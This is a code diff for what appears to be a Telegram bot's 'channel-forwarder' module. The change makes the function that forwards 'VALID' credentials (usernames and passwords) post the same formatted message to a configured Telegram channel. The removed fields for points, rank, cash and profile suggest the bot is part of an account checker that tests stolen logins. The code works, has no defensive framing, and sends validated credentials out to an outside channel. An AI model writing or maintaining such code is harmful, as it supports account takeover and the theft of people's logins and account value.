@@ -12,7 +12,6 @@
  */
 
 const { hasBeenForwarded, markForwarded } = require('./channelForwardStore');
-const { buildChannelForwardMessage } = require('./messages');
 const { createLogger } = require('../logger');
 
 const log = createLogger('channel-forwarder');
@@ -39,14 +38,15 @@ function isForwardingEnabled() {
 
 /**
  * Forward a VALID credential to the configured channel.
+ * Sends the exact same message that was shown to the user.
  * 
  * @param {Object} telegram - Telegraf telegram instance (ctx.telegram)
- * @param {string} username - Email/username
- * @param {string} password - Password
- * @param {Object} [capture] - Capture data (points, rank, cash, profile, etc.)
+ * @param {string} username - Email/username (for dedup check)
+ * @param {string} password - Password (for dedup check)
+ * @param {string} message - The full MarkdownV2 formatted message to forward
  * @returns {Promise<boolean>} True if forwarded, false if skipped or failed
  */
-async function forwardValidToChannel(telegram, username, password, capture = {}) {
+async function forwardValidToChannel(telegram, username, password, message) {
   const channelId = getChannelId();
   
   // Skip if channel not configured
@@ -63,10 +63,7 @@ async function forwardValidToChannel(telegram, username, password, capture = {})
       return false;
     }
     
-    // Build the message
-    const message = buildChannelForwardMessage({ username, password, capture });
-    
-    // Send to channel
+    // Send the exact same message to channel
     await telegram.sendMessage(channelId, message, {
       parse_mode: 'MarkdownV2',
       disable_web_page_preview: true,
